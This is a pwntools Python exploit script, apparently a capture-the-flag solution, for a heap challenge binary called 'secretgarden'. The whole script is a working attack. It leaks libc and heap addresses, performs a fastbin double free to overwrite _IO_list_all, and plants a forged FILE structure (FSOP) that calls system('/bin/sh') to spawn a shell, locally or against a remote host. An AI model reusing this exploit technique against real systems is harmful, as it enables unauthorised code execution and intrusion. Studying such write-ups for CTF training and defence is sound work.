#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('secretgarden_patched')
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def raise_flower(size, name, color):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", name)
    io.sendlineafter(b":", color)

def visit_garden(idx):
    io.sendlineafter(b":", b"2")
    io.recvuntil(f"flower[{str(idx)}] :".encode())
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))

def remove_flower(idx):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())

def solve():

    # get libc leak from unsorted bin
    raise_flower(0x90, b"A"*8, b"blue")
    raise_flower(0x28, b"B"*8, b"red")
    remove_flower(0)
    raise_flower(0x50, b"\x78", b"libc")
    main_arena = visit_garden(2)
    libc.address = main_arena - 0x3c3b78
    info("libc base: %#x", libc.address)

    # get heap leak
    for _ in range(2):
        raise_flower(0x60, b"pew", b"pew")

    remove_flower(3)
    raise_flower(0x60, b"heap", b"heap")

    for i in range(4, 2, -1):
        remove_flower(i)

    heap = visit_garden(5) - 0x1210
    info("heap base: %#x", heap)

    # fastbin double free => target _IO_list_all & write FSOP chain..
    remove_flower(4)
    
    target = libc.address + 0x3c44fd
    payload = b"A"*0x13 + p64(heap + 0x13b0)

    info("target addr: %#x", target)
    
    raise_flower(0x60, p64(target), b"corrupted!")
    for _ in range(2):
        raise_flower(0x60, b"pad", b"pad")
    
    raise_flower(0x60, payload, b"win")

    file = FileStructure()
    file.flags = b"/bin/sh\0"
    file._IO_write_ptr = 0x2
    file._IO_write_base = 0x1
    file.chain = libc.sym["system"]
    file.vtable = heap + 0x1400

    fake_io = bytes(file)
    raise_flower(len(fake_io), fake_io, b"fsop")
    
    io.sendlineafter(b":", b"5")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

